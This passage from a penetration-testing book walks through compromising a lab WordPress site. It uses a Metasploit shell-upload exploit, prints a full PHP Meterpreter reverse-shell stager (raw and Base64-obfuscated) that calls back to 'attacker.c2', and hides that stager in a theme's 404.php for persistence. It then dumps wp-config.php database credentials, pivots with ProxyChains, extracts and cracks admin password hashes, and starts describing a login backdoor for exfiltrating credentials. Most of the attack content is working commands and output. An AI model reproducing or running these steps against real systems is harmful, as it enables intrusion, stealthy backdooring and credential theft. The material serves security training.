+ RPORT      80                    yes       The target port (TCP)
+ SSL        false                 no        Negotiate SSL/TLS for outgoing connections
+ TARGETURI  /                     yes       The base path to the WordPress application
+<span class="strong"><strong> </strong></span>USERNAME<span class="strong"><strong>   mary                 </strong></span> yes       The WordPress username to authenticate with
+ VHOST                            no        HTTP server virtual host</pre></div><p>There are a <a id="id651" class="indexterm"/>few options we need to fill in with the right information before we can launch the exploit and hopefully get a shell back.</p><p>Let's execute the <code class="literal">exploit</code> module using the <code class="literal">run</code> command:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>msf exploit(unix/webapp/wp_admin_shell_upload) &gt; run</strong></span>
+
+[*] Started reverse TCP handler on 10.0.5.42:4444
+[*] Authenticating with WordPress using mary:spongebob...
+[+] Authenticated with WordPress
+[*] Preparing payload...
+[*] Uploading payload...
+<span class="strong"><strong>[*] Executing the payload at /wp-content/plugins/ydkwFvZLIl/rtYDipUTLv.php...</strong></span>
+[*] Sending stage (37543 bytes) to 172.17.0.3
+<span class="strong"><strong>[*] Meterpreter session 6 opened </strong></span>(10.0.5.42:4444 -&gt; 172.17.0.3:36670)
+[+] Deleted rtYDipUTLv.php
+[+] Deleted ydkwFvZLIl.php
+[+] Deleted ../ydkwFvZLIl
+meterpreter &gt;</pre></div><p>It appears the module ran successfully and spawned a Meterpreter session back to our attack machine. Metasploit has dropped in the <code class="literal">meterpreter</code> prompt and now we can issue commands on the target machine.</p><div class="informalexample"><pre class="programlisting">meterpreter &gt;<span class="strong"><strong> sysinfo</strong></span>
+Computer    : 71f92e12765d
+OS          : Linux 71f92e12765d 4.14.0 #1 SMP Debian 4.14.17 x86_64
+Meterpreter : php/linux
+
+meterpreter &gt;<span class="strong"><strong> getuid</strong></span>
+Server username: www-data (33)
+meterpreter &gt;</pre></div><p>While we do have access, there is a problem with this shell. It does not persist. If the server is restarted, the Meterpreter session will drop. If <code class="literal">mary</code> changes their password, we will lose access to the application altogether.</p><p>We have to get a <a id="id652" class="indexterm"/>bit more creative to maintain our access to the site. Thankfully, since it is so customizable, WordPress provides a file editor for plugins and themes. If we can modify a theme file and inject reverse shell code, every time we call it via the web, we will have access. If the administrator password changes tomorrow, we can still get back on.</p><p>In the WordPress admin panel, the <span class="strong"><strong>Themes</strong></span> section links to an <span class="strong"><strong>Editor</strong></span>, which can be used to modify PHP files belonging to any themes installed. It's a good idea to pick a theme that is disabled, in case we modify a file that is frequently accessed and users notice something is wrong.</p><p>Twenty Seventeen is the default WordPress theme and in this installation, it is not the primary theme. We can modify the <code class="literal">404.php</code> page and inject our code in there without alerting anyone.</p><div class="mediaobject"><img src="graphics/B09238_12_07.jpg" alt="Persistence"/><div class="caption"><p>Figure 12.7: WordPress theme file editor</p></div></div><p>We can generate a <a id="id653" class="indexterm"/>new PHP reverse shell using Metasploit by loading the <code class="literal">payload/php/meterpreter/reverse_tcp payload</code> module. The <code class="literal">LHOST</code> option should match our local hostname or IP, and the <code class="literal">LPORT</code> will be a local port for Metasploit to listen for incoming reverse shells. The target, once exploited, will connect back to us on this port.</p><p>In the Metasploit console, we can load it with the <code class="literal">use</code> command, as we did before:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>msf &gt; use payload/php/meterpreter/reverse_tcp</strong></span>
+<span class="strong"><strong>msf payload(php/meterpreter/reverse_tcp) &gt; options</strong></span>
+
+<span class="strong"><strong>Module options (payload/php/meterpreter/reverse_tcp):</strong></span>
+
+<span class="strong"><strong>   Name   Current Setting  Required  Description</strong></span>
+<span class="strong"><strong>   ----   ---------------  --------  -----------</strong></span>
+<span class="strong"><strong>   LHOST  attacker.c2      yes       The listen address</strong></span>
+<span class="strong"><strong>   LPORT  4444             yes       The listen port</strong></span>
+
+<span class="strong"><strong>msf payload(php/meterpreter/reverse_tcp) &gt;</strong></span>
+</pre></div><p>The payload <code class="literal">php/meterpreter/reverse_tcp</code> is a Meterpreter stager written in PHP and while it's not ideal from a stability standpoint, it does provide us with most of the functionality of a typical Meterpreter reverse shell.</p><p>When loading a payload<a id="id654" class="indexterm"/> within Metasploit, as opposed to generating one with the MSFvenom tool, we have the <code class="literal">generate</code> command available to us. This command can show us all the options available for creating a new payload.</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>msf payload(php/meterpreter/reverse_tcp) &gt; generate -h</strong></span>
+<span class="strong"><strong>Usage: generate [options]</strong></span>
+
+<span class="strong"><strong>Generates a payload.</strong></span>
+
+<span class="strong"><strong>OPTIONS:</strong></span>
+
+<span class="strong"><strong>    -E        Force encoding.</strong></span>
+<span class="strong"><strong>    -b &lt;opt&gt;  The list of characters to avoid: '\x00\xff'</strong></span>
+<span class="strong"><strong>    -e &lt;opt&gt;  The name of the encoder module to use.</strong></span>
+<span class="strong"><strong>    -f &lt;opt&gt;  The output file name (otherwise stdout)</strong></span>
+<span class="strong"><strong>    -h        Help banner.</strong></span>
+<span class="strong"><strong>    -i &lt;opt&gt;  the number of encoding iterations.</strong></span>
+<span class="strong"><strong>    -k        Keep the template executable functional</strong></span>
+<span class="strong"><strong>    -o &lt;opt&gt;  A comma separated list of options in VAR=VAL format.</strong></span>
+<span class="strong"><strong>    -p &lt;opt&gt;  The Platform for output.</strong></span>
+<span class="strong"><strong>    -s &lt;opt&gt;  NOP sled length.</strong></span>
+<span class="strong"><strong>    -t &lt;opt&gt;  The output format: bash,c,csharp,dw,dword,hex,java,js_be,js_le,num,perl,pl,powershell,ps1,py,python,raw,rb,ruby,sh,vbapplication,vbscript,asp,aspx,aspx-exe,axis2,dll,elf,elf-so,exe,exe-only,exe-service,exe-small,hta-psh,jar,jsp,loop-vbs,macho,msi,msi-nouac,osx-app,psh,psh-cmd,psh-net,psh-reflection,vba,vba-exe,vba-psh,vbs,war</strong></span>
+<span class="strong"><strong>    -x &lt;opt&gt;  The executable template to use</strong></span>
+</pre></div><p>For a PHP payload, not many of these switches will have an impact. We can generate the raw payload, which would be the PHP code for the stager. We don't have to write it to a file; it's typically fairly small and we can copy it straight from the terminal output.</p><div class="informalexample"><pre class="programlisting">msf payload(php/meterpreter/reverse_tcp) &gt; generate -t raw
+<span class="strong"><strong>/*&lt;?php /**/ error_reporting(0); $ip = 'attacker.c2'; $port = 4444; if (($f = 'stream_socket_client') &amp;&amp; is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s &amp;&amp; ($f = 'fsockopen') &amp;&amp; is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s &amp;&amp; ($f = 'socket_create') &amp;&amp; is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) &lt; $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') &amp;&amp; ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();</strong></span>
+
+msf payload(php/meterpreter/reverse_tcp) &gt;</pre></div><p>The result of the <code class="literal">generate</code> command<a id="id655" class="indexterm"/> is a long, minified piece of PHP code, which we can further obfuscate by encoding it to Base64 using the <code class="literal">-E</code> switch:</p><div class="informalexample"><pre class="programlisting">msf payload(php/meterpreter/reverse_tcp) &gt; generate -t raw -E
+<span class="strong"><strong>eval(base64_decode(Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlwID0gJ2F0dGFja2VyLmMyJzsgJHBvcnQgPSA0NDQ0OyBpZiAoKCRmID0gJ3N0cmVhbV9zb2NrZXRfY2xpZW50JykgJiYgaXNfY2FsbGFibGUoJGYpKSB7ICRzID0gJGYoInRjcDovL3skaXB9OnskcG9ydH0iKTsgJHNfdHlwZSA9ICdzdHJlYW0nOyB9IGlmICghJHMgJiYgKCRmID0gJ2Zzb2Nrb3BlbicpICYmIGlzX2NhbGxhYmxlKCRmKSkgeyAkcyA9ICRmKCRpcCwgJHBvcnQpOyAkc190eXBlID0gJ3N0cmVhbSc7IH0gaWYgKCEkcyAmJiAoJGYgPSAnc29ja2V0X2NyZWF0ZScpICYmIGlzX2NhbGxhYmxlKCRmKSkgeyAkcyA9ICRmKEFGX0lORVQsIFNPQ0tfU1RSRUFNLCBTT0xfVENQKTsgJHJlcyA9IEBzb2NrZXRfY29ubmVjdCgkcywgJGlwLCAkcG9ydCk7IGlmICghJHJlcykgeyBkaWUoKTsgfSAkc190eXBlID0gJ3NvY2tldCc7IH0gaWYgKCEkc190eXBlKSB7IGRpZSgnbm8gc29ja2V0IGZ1bmNzJyk7IH0gaWYgKCEkcykgeyBkaWUoJ25vIHNvY2tldCcpOyB9IHN3aXRjaCAoJHNfdHlwZSkgeyBjYXNlICdzdHJlYW0nOiAkbGVuID0gZnJlYWQoJHMsIDQpOyBicmVhazsgY2FzZSAnc29ja2V0JzogJGxlbiA9IHNvY2tldF9yZWFkKCRzLCA0KTsgYnJlYWs7IH0gaWYgKCEkbGVuKSB7IGRpZSgpOyB9ICRhID0gdW5wYWNrKCJO.bGVuIiwgJGxlbik7ICRsZW4gPSAkYVsnbGVuJ107ICRiID0gJyc7IHdoaWxlIChzdHJsZW4oJGIpIDwgJGxlbikgeyBzd2l0Y2ggKCRzX3R5cGUpIHsgY2FzZSAnc3RyZWFtJzogJGIgLj0gZnJlYWQoJHMsICRsZW4tc3RybGVuKCRiKSk7IGJyZWFrOyBjYXNlICdzb2NrZXQnOiAkYiAuPSBzb2NrZXRfcmVhZCgkcywgJGxlbi1zdHJsZW4oJGIpKTsgYnJlYWs7IH0gfSAkR0xPQkFMU1snbXNnc29jayddID0gJHM7ICRHTE9CQUxTWydtc2dzb2NrX3R5cGUnXSA9ICRzX3R5cGU7IGlmIChleHRlbnNpb25fbG9hZGVkKCdzdWhvc2luJykgJiYgaW5pX2dldCgnc3Vob3Npbi5leGVjdXRvci5kaXNhYmxlX2V2YWwnKSkgeyAkc3Vob3Npbl9ieXBhc3M9Y3JlYXRlX2Z1bmN0aW9uKCcnLCAkYik7ICRzdWhvc2luX2J5cGFzcygpOyB9IGVsc2UgeyBldmFsKCRiKTsgfSBkaWUoKTs));</strong></span>
+
+<span class="strong"><strong>msf payload(php/meterpreter/reverse_tcp) &gt;</strong></span>
+</pre></div><p>It really depends on what the injection point allows. We may need to Base64-encode the staging PHP code in order to bypass some rudimentary intrusion detection system or antivirus agent. If anyone looks at the source, an encoded payload does look a bit more suspicious among properly formatted code, so we'd have to really consider how stealthy we want to be.</p><p>To make sure our code blends in more with the rest of the <code class="literal">404.php</code> page, we can use a source code beautifier like <span class="strong"><strong>CyberChef</strong></span>. Let's take the non-Base64-encoded raw PHP code and run it through the CyberChef tool.</p><p>On the <span class="strong"><strong>Recipe</strong></span> pane, we can add the <span class="strong"><strong>Generic Code Beautify</strong></span> operation. Our raw PHP code will go in the <span class="strong"><strong>Input</strong></span> section. To beautify our code, we simply have to click <span class="strong"><strong>Bake!</strong></span> at the bottom of the screen, as shown:</p><div class="mediaobject"><img src="graphics/B09238_12_08.jpg" alt="Persistence"/><div class="caption"><p>Figure 12.8: CyberChef code beautifier</p></div></div><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note79"/>Note</h3><p>CyberChef is a great<a id="id656" class="indexterm"/> tool with a ton of features. Code beautification is just scratching the surface of what it can do. CyberChef is developed by GCHQ and available for free to use online or to download at <a class="ulink" href="https://gchq.github.io/CyberChef">https://gchq.github.io/CyberChef</a>
+</p></div></div><p>At this point, we can <a id="id657" class="indexterm"/>grab the beautified payload and paste it right into the WordPress theme editor. We need to add the code immediately before the <code class="literal">get_header()</code> function is called. This is because <code class="literal">404.php</code> was meant to be <code class="literal">include()</code>-d in another page that loads the definition for this function. When we call the <code class="literal">404</code> page directly, <code class="literal">get_header()</code> will not be defined and PHP will throw a fatal error. Our shell code will not be executed. We have to be aware of these types of issues when we are modifying anything on the target. Ideally, if time permits, we setup a similar test environment and check to see how the application handles our modifications.</p><p>The Meterpreter payload will <a id="id658" class="indexterm"/>fit nicely just above the <code class="literal">get_header()</code> function on line 12, as shown:</p><div class="mediaobject"><img src="graphics/B09238_12_09.jpg" alt="Persistence"/><div class="caption"><p>Figure 12.9: 404.php page editor payload injection location</p></div></div><p>Adding the code in this location should prevent any PHP errors from interfering with our malicious code.</p><div class="mediaobject"><img src="graphics/B09238_12_10.jpg" alt="Persistence"/><div class="caption"><p>Figure 12.10: Our malicious payload blending in with the rest of 404.php</p></div></div><p>Before we execute the <a id="id659" class="indexterm"/>backdoor that we've just injected, we have to make sure we have a handler running on our attack machine to grab the incoming connections from the victim.</p><p>To do this, we load the <code class="literal">exploit/multi/handler</code> module in the Metasploit console as follows:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>msf &gt; use exploit/multi/handler</strong></span>
+</pre></div><p>We need to specify which payload type the handler should be configured for using the <code class="literal">set PAYLOAD</code> command:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>msf exploit(multi/handler) &gt; set PAYLOAD php/meterpreter/reverse_tcp</strong></span>
+<span class="strong"><strong>msf exploit(multi/handler) &gt;</strong></span>
+</pre></div><p>We have to make sure the payload options match what we chose when we generated the PHP code earlier. Both of these options can also be configured with the <code class="literal">set</code> command:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>msf exploit(multi/handler) &gt; options</strong></span>
+
+<span class="strong"><strong>Payload options (php/meterpreter/reverse_tcp):</strong></span>
+
+<span class="strong"><strong>   Name   Current Setting  Required  Description</strong></span>
+<span class="strong"><strong>   ----   ---------------  --------  -----------</strong></span>
+<span class="strong"><strong>   LHOST  attacker.c2      yes       The listen address</strong></span>
+<span class="strong"><strong>   LPORT  4444             yes       The listen port</strong></span>
+
+
+<span class="strong"><strong>Exploit target:</strong></span>
+
+<span class="strong"><strong>   Id  Name</strong></span>
+<span class="strong"><strong>   --  ----</strong></span>
+<span class="strong"><strong>   0   Wildcard Target</strong></span>
+</pre></div><p>We can also configure the handler to accept multiple connections and run in the background. New sessions will be created automatically; we wouldn't have to run the handler every time.</p><p>The <code class="literal">ExitOnSession</code> options can be set to <code class="literal">false</code> as follows:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>msf exploit(multi/handler) &gt; set ExitOnSession false</strong></span>
+<span class="strong"><strong>ExitOnSession =&gt; false</strong></span>
+</pre></div><p>We can now run the handler with the <code class="literal">-j</code> option, which will send it to the background, ready for incoming connections from our victim:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>msf exploit(multi/handler) &gt; run -j</strong></span>
+<span class="strong"><strong>[*] Exploit running as background job 2.</strong></span>
+
+<span class="strong"><strong>[*] Started reverse TCP handler on attacker.c2:4444</strong></span>
+<span class="strong"><strong>msf exploit(multi/handler) &gt;</strong></span>
+</pre></div><p>The backdoored <code class="literal">404.php</code> file is located <a id="id660" class="indexterm"/>in the <code class="literal">wp-content/themes/twentyseventeen/</code> folder on the target application and can be called directly with <code class="literal">curl</code>. This will execute our backdoor and spawn a new Meterpreter session:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>root@kali:~# curl http://cookingwithfire.local/wp-content/themes/twentyseventeen/404.php</strong></span>
+<span class="strong"><strong>[...]</strong></span>
+</pre></div><p>The <code class="literal">cur</code>l command appears to hang, but a few seconds later, we have shell access. We can see the victim establishing a Meterpreter session, which we can interact with using the <code class="literal">sessions -i</code> command, as shown:</p><div class="informalexample"><pre class="programlisting">[*] Sending stage (37543 bytes) to 172.17.0.3
+<span class="strong"><strong>[*] Meterpreter session 8 opened </strong></span>(10.0.5.42:4444 -&gt; 172.17.0.3:36194)
+
+msf exploit(multi/handler) &gt;<span class="strong"><strong> sessions -i 8</strong></span>
+[*] Starting interaction with 8...
+
+meterpreter &gt;</pre></div><p>Once again, we can issue commands directly to the target through the Meterpreter session:</p><div class="informalexample"><pre class="programlisting">meterpreter &gt; <span class="strong"><strong>sysinfo</strong></span>
+Computer    : 0f2dfe914f09
+OS          : Linux 0f2dfe914f09 4.14.0 #1 SMP Debian 4.14.17 x86_64
+Meterpreter : php/linux
+
+meterpreter &gt;<span class="strong"><strong> getuid</strong></span>
+Server username: www-data (33)
+meterpreter &gt;</pre></div><p>With shell access, we can attempt to escalate privileges, move laterally, or even extract more credentials.</p></div><div class="section" title="Credential exfiltration"><div class="titlepage"><div><div><h2 class="title"><a id="ch12lvl2sec67"/>Credential exfiltration</h2></div></div></div><p>Consider another scenario where we <a id="id661" class="indexterm"/>have exploited a vulnerability in the website, granting us shell access to the server. Maybe the WordPress site itself is patched and user passwords are complex, but if the WordPress installation is hosted on a shared system, it is not uncommon for attackers to gain shell access through an unrelated component of the site. Perhaps we managed to upload a web shell or even force the web server to spawn a reverse shell back to our machine through a command injection flaw. In the earlier scenario, we had guessed the password of <code class="literal">mary</code>, but what if we wanted more? What if the blog owner <code class="literal">msmith</code> has access to other systems?</p><p>Password reuse is a problem that likely will not go away anytime soon and there is value in grabbing the site administrator's password. The same password could work for VPN or OWA, or even the root user on the application server itself.</p><p>Most modern web server software, such as Apache2, NGINX, and IIS, runs applications with a low-privileged user context and thus a PHP shell would have limited access to the underlying server. While the web user can't do much to the server itself, it can interact with the site source code, including that of the CMS instance. We may look for ways to escalate privilege using a local exploit, but if unsuccessful or strapped for time, it may make more sense to backdoor the site code and collect credentials.</p><p>In the previous scenario, we have gained shell access through the user <code class="literal">mary</code>. Once inside, we can inspect the <code class="literal">wp-config.php</code> for potential locations for injection. We can see the database credentials that WordPress requires to function properly. This could be our first target, since all WordPress credentials are stored there, albeit hashed. If we can retrieve these hashed passwords, we may be able to crack them offline. Configuration files are common for CMSs and<a id="id662" class="indexterm"/> if we have read access to the application server, these should be one of the first things we harvest:</p><div class="informalexample"><pre class="programlisting">meterpreter &gt; cat /var/www/html/wp-config.php
+&lt;?php
+/**
+ * The base configuration for WordPress
+ *
+[...]
+ * This file contains the following configurations:
+<span class="strong"><strong> *</strong></span>
+<span class="strong"><strong> * * MySQL settings</strong></span>
+<span class="strong"><strong> * * Secret keys</strong></span>
+<span class="strong"><strong> * * Database table prefix</strong></span>
+<span class="strong"><strong> * * ABSPATH</strong></span>
+<span class="strong"><strong> *</strong></span>
+<span class="strong"><strong> * @link https://codex.WordPress.org/Editing_wp-config.php</strong></span>
+<span class="strong"><strong> *</strong></span>
+<span class="strong"><strong> * @package WordPress</strong></span>
+<span class="strong"><strong> */</strong></span>
+
+<span class="strong"><strong>// ** MySQL settings - You can get this info from your web host ** //</strong></span>
+<span class="strong"><strong>/** The name of the database for WordPress */</strong></span>
+<span class="strong"><strong>define('DB_NAME', 'WordPress');</strong></span>
+
+<span class="strong"><strong>/** MySQL database username */</strong></span>
+<span class="strong"><strong>define('DB_USER', '</strong></span>
+<span class="strong"><strong>WordPress');</strong></span>
+
+<span class="strong"><strong>/** MySQL database password */</strong></span>
+<span class="strong"><strong>define('DB_PASSWORD', 'ZXQgdHUgYnJ1dGU/');</strong></span>
+
+<span class="strong"><strong>/** MySQL hostname */</strong></span>
+<span class="strong"><strong>define('DB_HOST', '127.0.0.1:3306');</strong></span>
+
+[...]</pre></div><p>We could grab these plaintext credentials and connect to the database using a MySQL client. We can then proceed to dump the user table and any hashes within. In your travels, you will likely come across more hardened MySQL instances, which typically will not allow login from just any remote host. The MySQL instance may also be firewalled or only listening on <code class="literal">127.0.0.1</code> and we may not be able to connect from the outside.</p><p>To get around these types <a id="id663" class="indexterm"/>of restrictions, we'd have to pivot the connection through our reverse shell session, which we've established earlier:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>msf payload(php/meterpreter/reverse_tcp) &gt; sessions</strong></span>
+
+<span class="strong"><strong>Active sessions</strong></span>
+<span class="strong"><strong>===============</strong></span>
+
+<span class="strong"><strong>  Id  Name  Type              Information       Connection</strong></span>
+<span class="strong"><strong>  --  ----  ----              -----------       ----------</strong></span>
+<span class="strong"><strong>  8         meterpreter php/                    www-data @ linux                               0f2dfe914f09  10.0.5.42:4444 -&gt; </strong></span>
+<span class="strong"><strong>172.17.0.3:36194 (172.17.0.3)</strong></span>
+</pre></div><p>First, we need to add a route in Metasploit that will forward any connections through an active Meterpreter session. In this case, we want to connect to the MySQL instance listening on the server loopback: <code class="literal">127.0.0.1</code>.</p><p>The Metasploit <code class="literal">route add</code> command requires we specify a network range and a Meterpreter session ID. In our case, we will be targeting only the <code class="literal">127.0.0.1</code> address, therefore a <code class="literal">/32</code> is in order. We also want to send all our packets through session <code class="literal">8</code>, in this case:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>msf payload(php/meterpreter/reverse_tcp) &gt; route add 127.0.0.1/32 8</strong></span>
+<span class="strong"><strong>[*] Route added</strong></span>
+<span class="strong"><strong>msf payload(php/meterpreter/reverse_tcp) &gt; route print</strong></span>
+
+<span class="strong"><strong>IPv4 Active Routing Table</strong></span>
+<span class="strong"><strong>=========================</strong></span>
+
+<span class="strong"><strong>   Subnet             Netmask            Gateway</strong></span>
+<span class="strong"><strong>   ------             -------            -------</strong></span>
+<span class="strong"><strong>   127.0.0.1           255.255.255.255    Session 8</strong></span>
+</pre></div><p>To make use of this route, we need to launch a proxy server within Metasploit, which we can use together with ProxyChains to send packets through our Meterpreter session.</p><p>The <code class="literal">auxiliary/server/socks4a</code> module will allow us to spawn a SOCKS4 server on the attack machine and using the previously added route, any traffic destined for <code class="literal">127.0.0.1</code> will be forwarded through our session.</p><p>Let's load the module and set the <code class="literal">SRVHOST</code> and <code class="literal">SRVPORT</code> as shown:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>msf payload(php/meterpreter/reverse_tcp) &gt; use auxiliary/server/socks4a</strong></span>
+<span class="strong"><strong>msf auxiliary(server/socks4a) &gt; options</strong></span>
+
+<span class="strong"><strong>Module options (auxiliary/server/socks4a):</strong></span>
+
+<span class="strong"><strong>   Name     Current Setting  Required  Description</strong></span>
+<span class="strong"><strong>   ----     ---------------  --------  -----------</strong></span>
+<span class="strong"><strong>   SRVHOST  0.0.0.0          yes       The address to listen on</strong></span>
+<span class="strong"><strong>   SRVPORT  1080             yes       The port to listen on.</strong></span>
+
+<span class="strong"><strong>msf auxiliary(server/socks4a) &gt; run</strong></span>
+<span class="strong"><strong>[*] Auxiliary module running as background job 1.</strong></span>
+<span class="strong"><strong>[*] Starting the socks4a proxy server</strong></span>
+</pre></div><p>We should be able to see<a id="id664" class="indexterm"/> our SOCKS server running in the background by executing the Metasploit <code class="literal">jobs</code> command:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>msf auxiliary(server/socks4a) &gt; jobs</strong></span>
+
+<span class="strong"><strong>Jobs</strong></span>
+<span class="strong"><strong>====</strong></span>
+
+<span class="strong"><strong>  Id  Name                 Payload                Payload opts</strong></span>
+<span class="strong"><strong>  --  ----                 -------                ------------</strong></span>
+<span class="strong"><strong>  0   Exploit: multi/      php/meterpreter/       tcp://attackhandler              reverse_tcp            er.c2:4444</strong></span>
+<span class="strong"><strong>  1    Auxiliary: server/socks4a      </strong></span>
+</pre></div><p>Next, the ProxyChains configuration file <code class="literal">/etc/proxychains.conf</code> should be modified to point to our newly spawned SOCKS server, as shown:</p><div class="informalexample"><pre class="programlisting">root@kali:~# tail /etc/proxychains.conf
+[...]
+#
+#       proxy types: http, socks4, socks5
+#        ( auth types supported: "basic"-http  "user/pass"-socks )
+#
+[ProxyList]
+<span class="strong"><strong>socks4     127.0.0.1 1080</strong></span>
+</pre></div><p>Finally, we use the <code class="literal">proxychains</code> binary in our Kali terminal to wrap the MySQL client connection to the target's MySQL instance using the credentials from <code class="literal">wp-config.php</code>, as shown:</p><div class="informalexample"><pre class="programlisting">root@kali:~# proxychains mysql -h127.0.0.1 -uWordPress -p
+ProxyChains-3.1 (http://proxychains.sf.net)
+Enter password:<span class="strong"><strong> ZXQgdHUgYnJ1dGU/</strong></span>
+|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-127.0.0.1:3306-&lt;&gt;&lt;&gt;-OK
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 28
+Server version: 5.6.37 MySQL Community Server (GPL)
+
+<span class="strong"><strong>Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.</strong></span>
+</pre></div><p>This WordPress database<a id="id665" class="indexterm"/> user will likely have limited access to the server as well, but it should be enough for our purposes. We can see the WordPress database and we can enumerate its tables and data:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>MySQL [(none)]&gt; show databases;</strong></span>
+<span class="strong"><strong>+--------------------+</strong></span>
+<span class="strong"><strong>| Database           |</strong></span>
+<span class="strong"><strong>+--------------------+</strong></span>
+<span class="strong"><strong>| information_schema |</strong></span>
+<span class="strong"><strong>| WordPress          |</strong></span>
+<span class="strong"><strong>| test               |</strong></span>
+<span class="strong"><strong>+--------------------+</strong></span>
+<span class="strong"><strong>3 rows in set (0.00 sec)</strong></span>
+
+<span class="strong"><strong>MySQL [none]&gt; show tables from WordPress;</strong></span>
+<span class="strong"><strong>+-----------------------------+</strong></span>
+<span class="strong"><strong>| Tables_in_WordPress |</strong></span>
+<span class="strong"><strong>+-----------------------------+</strong></span>
+<span class="strong"><strong>| wp_commentmeta              |</strong></span>
+<span class="strong"><strong>| wp_comments                 |</strong></span>
+<span class="strong"><strong>| wp_links                    |</strong></span>
+<span class="strong"><strong>| wp_options                  |</strong></span>
+<span class="strong"><strong>| wp_postmeta                 |</strong></span>
+<span class="strong"><strong>| wp_posts                    |</strong></span>
+<span class="strong"><strong>| wp_term_relationships       |</strong></span>
+<span class="strong"><strong>| wp_term_taxonomy            |</strong></span>
+<span class="strong"><strong>| wp_termmeta                 |</strong></span>
+<span class="strong"><strong>| wp_terms                    |</strong></span>
+<span class="strong"><strong>| wp_usermeta                 |</strong></span>
+<span class="strong"><strong>| wp_users                    |</strong></span>
+<span class="strong"><strong>+-----------------------------+</strong></span>
+<span class="strong"><strong>12 rows in set (0.00 sec)</strong></span>
+</pre></div><p>We need to grab the usernames and hashes stored in the <code class="literal">wp_users</code> table using a simple MySQL query:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>MySQL [none]&gt; select id, user_login, user_pass, user_email from WordPress.wp_users where id=1;</strong></span>
+<span class="strong"><strong>+----+------------+------------------------+------------------+</strong></span>
+<span class="strong"><strong>| id | user_login | user_pass              | user_email       |</strong></span>
+<span class="strong"><strong>+----+------------+------------------------+------------------+</strong></span>
+<span class="strong"><strong>|  1 | msmith     | $P$BX5YqWaua3jKQ1OBFgui| msmith@cookingwit|</strong></span>
+<span class="strong"><strong>|    |            | UhBxsiGutK/            | hfire.local      |</strong></span>
+<span class="strong"><strong>+----+------------+------------------------+------------------+</strong></span>
+<span class="strong"><strong>1 row in set (0.01 sec)</strong></span>
+</pre></div><p>With the password hash of <code class="literal">msmith</code> in hand, we can launch John the Ripper on our Kali machine in an attempt to <a id="id666" class="indexterm"/>crack it. We can save the hash locally and run <code class="literal">john</code> against it, as shown:</p><div class="informalexample"><pre class="programlisting">root@kali:~# cat hashes
+<span class="strong"><strong>msmith:$P$BX5YqWaua3jKQ1OBFquiUhBxsiGutK/</strong></span>
+root@kali:~#<span class="strong"><strong> john hashes --</strong></span>
+<span class="strong"><strong>wordlist=~/tools/SecLists/Passwords/darkc0de.txt</strong></span>
+Using default input encoding: UTF-8
+Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:01 0.72% (ETA: 10:24:24) 0g/s 4897p/s 4897c/s 4897C/s 11770..11/9/69
+0g 0:00:00:02 1.10% (ETA: 10:25:08) 0g/s 4896p/s 4896c/s 4896C/s 123din7361247iv3..123ducib19
+0g 0:00:00:04 1.79% (ETA: 10:25:49) 0g/s 4906p/s 4906c/s 4906C/s 16 HERRERA..16th
+0g 0:00:00:20 6.59% (ETA: 10:27:09) 0g/s 4619p/s 4619c/s 4619C/s 4n0d3..4n0m47h3c4</pre></div><p>Depending on your password cracking rig and the password complexity, this may take a while. It may not even be feasible during a typical engagement and you may need an alternative.</p><p>A smarter way to get the plaintext credentials is to backdoor the CMS code for the login system and to capture the credentials in cleartext as the target user (or users) logs in to the application. This particular attack requires that the user we have control over can modify WordPress files on disk. Some installations will not allow the webserver user to write to the disk as a security precaution, but it is not uncommon for administrators to loosen this control during the lifetime of the application. This attack is also useful if we have full root access to the target server as well. As I mentioned before, there's value in capturing credentials in cleartext, especially when the goal is lateral movement or sensitive data access.</p><p>The function within WordPress that handles authentication is called <code class="literal">wp_signon()</code> and the WordPress Codex describes it in detail:</p><div class="mediaobject"><img src="graphics/B09238_12_11.jpg" alt="Credential exfiltration"/><div class="caption"><p>Figure 12.11: WordPress Function Reference for wp_signon</p></div></div><p>The <code class="literal">signon</code> function is defined in the <code class="literal">wp-includes/user.php</code> WordPress core file. There are several lines of code that verify the credentials passed to the function from other modules, such as <code class="literal">wp-login.php</code>.</p><p>We want to intercept the<a id="id667" class="indexterm"/> cleartext credentials and either exfiltrate them to our C2 server or store them somewhere on the website for later retrieval, or both. There are, of course, pros and cons to both methods of exfiltration. Sending the data over the wire can be picked up as unusual traffic by intrusion detection systems or egress proxies, but it ensures we get the credentials as soon 